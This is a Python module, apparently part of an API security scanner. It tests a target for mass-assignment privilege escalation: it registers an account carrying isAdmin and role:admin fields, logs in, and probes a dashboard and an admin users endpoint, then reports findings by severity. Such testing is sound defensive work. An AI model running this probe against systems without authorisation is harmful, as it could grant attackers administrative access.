import requests
import random
import string

def random_email():
    rand = ''.join(random.choices(string.ascii_lowercase, k=6))
    return f"masstest_{rand}@example.com"

def random_number():
    return '9' + ''.join(random.choices(string.digits, k=9))

def check_mass_assignment(config):
    base_url = config["target"]["base_url"]
    findings = []

    # --- 1. Signup with extra privileged fields ---
    test_email = random_email()
    payload = {
        "name": "Mass Test",
        "email": test_email,
        "password": "Testpass@123",
        "number": random_number(),
        "isAdmin": True,
        "role": "admin",
        "admin": True,
        "is_admin": True,
    }

    signup_resp = requests.post(
        base_url + "/identity/api/auth/signup",
        json=payload,
        timeout=5
    )

    if signup_resp.status_code not in [200, 201]:
        findings.append({
            "check": "Mass Assignment",
            "severity": "INFO",
            "endpoint": "/identity/api/auth/signup",
            "method": "POST",
            "detail": f"Signup failed with {signup_resp.status_code} — could not test"
        })
        return findings

    # --- 2. Login with the new account ---
    login_resp = requests.post(
        base_url + "/identity/api/auth/login",
        json={"email": test_email, "password": "Testpass@123"},
        timeout=5
    )

    token = None
    if login_resp.status_code == 200:
        data = login_resp.json()
        token = data.get("token") or data.get("access_token")

    if not token:
        findings.append({
            "check": "Mass Assignment",
            "severity": "INFO",
            "endpoint": "/identity/api/auth/login",
            "method": "POST",
            "detail": "Could not login with mass assignment test account"
        })
        return findings

    headers = {"Authorization": f"Bearer {token}"}

    # --- 3. Check if admin fields were accepted in profile ---
    dashboard_resp = requests.get(
        base_url + "/identity/api/v2/user/dashboard",
        headers=headers,
        timeout=5
    )

    is_admin_granted = False
    if dashboard_resp.status_code == 200:
        try:
            body = dashboard_resp.json()
            role = str(body.get("role", "")).lower()
            is_admin = body.get("isAdmin") or body.get("is_admin") or body.get("admin")
            if role == "admin" or is_admin:
                is_admin_granted = True
        except Exception:
            pass

    findings.append({
        "check": "Mass Assignment",
        "severity": "CRITICAL" if is_admin_granted else "PASS",
        "endpoint": "/identity/api/auth/signup",
        "method": "POST",
        "detail": "Server accepted isAdmin:true and granted admin role"
                  if is_admin_granted
                  else "Extra fields ignored — admin role not granted"
    })

    # --- 4. Try accessing admin endpoint with this token ---
    admin_resp = requests.get(
        base_url + "/identity/api/v2/admin/users",
        headers=headers,
        timeout=5
    )

    findings.append({
        "check": "Mass Assignment",
        "severity": "CRITICAL" if admin_resp.status_code == 200 else "PASS",
        "endpoint": "/identity/api/v2/admin/users",
        "method": "GET",
        "detail": f"Mass-assigned account accessed admin endpoint: {admin_resp.status_code}"
                  + (" — privilege escalation confirmed" if admin_resp.status_code == 200 else "")
    })

    return findings